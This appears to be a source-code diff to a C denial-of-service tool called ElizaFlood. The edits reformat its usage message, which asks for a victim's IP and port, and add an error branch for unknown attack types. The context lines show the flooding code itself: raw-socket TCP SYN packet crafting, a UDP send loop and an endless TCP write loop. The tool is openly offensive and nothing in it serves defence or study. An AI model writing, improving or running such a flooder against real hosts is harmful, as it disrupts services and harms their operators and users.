@@ -45,7 +45,14 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 
 int main(int argv, char *argc[]) {
     if(argv != 4) {
-        printf("Wrong number of arguments!\n\n./ElizaFlood [attack type] [address] [port]\n[attack type]:\tudp, tcp, tcp-syn\n[adress]:\tvictims ip\n[port]:\t\tvictims port\n\n");
+        printf("Wrong number of arguments!\n\n");
+        printf("===============================================\n");
+        printf("| ./ElizaFlood [attack type] [address] [port] |\n");
+        printf("|=============================================|\n");
+        printf("| [attack type]: udp, tcp, tcp-syn            |\n");
+        printf("| [adress]: victims ip                        |\n");
+        printf("| [port]: victims port                        |\n");
+        printf("===============================================\n\n");
         exit(0);
     }
     int sockfd;
@@ -70,7 +77,7 @@ int main(int argv, char *argc[]) {
             sendto(sockfd, (const char *)hello, strlen(hello), MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
         }
     }
-    if(strcmp(argc[1], "tcp-syn") == 0) {
+    else if(strcmp(argc[1], "tcp-syn") == 0) {
         int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
         char datagram[4096] , source_ip[32];
         struct iphdr *iph = (struct iphdr *) datagram;
@@ -139,7 +146,7 @@ int main(int argv, char *argc[]) {
             }
         }
     }
-    if(strcmp(argc[1], "tcp") == 0) {
+    else if(strcmp(argc[1], "tcp") == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
             perror("socket creation failed");
             exit(EXIT_FAILURE);
@@ -152,6 +159,16 @@ int main(int argv, char *argc[]) {
         while(1) {
             write(sockfd, hello, sizeof(hello));
         }
+    }
+    else {
+        printf("attack type unknown!\n\n");
+        printf("===============================================\n");
+        printf("| ./ElizaFlood [attack type] [address] [port] |\n");
+        printf("|=============================================|\n");
+        printf("| [attack type]: udp, tcp, tcp-syn            |\n");
+        printf("| [adress]: victims ip                        |\n");
+        printf("| [port]: victims port                        |\n");
+        printf("===============================================\n\n");
     }
     close(sockfd);
     return 0;
